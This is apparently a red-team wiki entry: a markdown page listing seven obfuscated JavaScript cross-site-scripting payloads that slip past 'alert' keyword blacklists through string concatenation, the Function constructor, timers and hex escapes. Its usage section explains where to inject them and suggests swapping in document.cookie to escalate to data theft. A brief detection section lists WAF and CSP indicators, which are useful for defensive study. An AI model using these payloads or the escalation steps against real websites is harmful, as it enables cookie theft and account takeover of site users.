---
id: f23ad3f8-ac32-4372-99b5-ec8a3ac4a769
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.373721+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - xss-payload
  - filter-bypass
  - obfuscation
  - code-evaluation
platforms:
  - Web
validated: true
---

# JavaScript-Exotic-Alert-Payloads-for-Filter-Bypass

## Code

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29`();
```

## Description

This code snippet contains multiple obfuscated variants of JavaScript payloads designed to execute an alert() function despite word blacklists that filter common strings like 'alert'. Each line represents a different evasion technique: string concatenation (eval('ale'+'rt(0)')), Function constructor with concatenation, template literals with escapes, setTimeout/setInterval for delayed/repeated execution, and Set.constructor for dynamic function creation with hex escapes. These are useful in XSS or code injection scenarios where direct keywords are blocked.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | These payloads use hardcoded alert arguments (0-14) for testing; replace with custom code like document.cookie for escalation. | N/A |

## Usage

Inject these payloads into vulnerable inputs that lead to JavaScript evaluation, such as URL parameters, form fields, or cookies in a reflected/stored XSS context. Start with the simplest (e.g., eval variant) and progress to more complex ones if needed. For example, append to a URL: ?q=eval('ale'+'rt(0)'). Used in procedures like [[procedures/Bypass-JavaScript-Word-Blacklist-with-Exotic-Payloads]] to confirm filter evasion before escalating to data theft.

## Detection

- Browser developer tools showing unusual string constructions or constructor calls.
- WAF logs detecting patterns like 'ale'+'rt' or hex escapes (\x65rt).
- CSP violations for eval() or Function() usage.
- Anomalous alert dialogs or network requests triggered by injected code.

## Related

- [[procedures/Bypass-JavaScript-Word-Blacklist-with-Exotic-Payloads]]
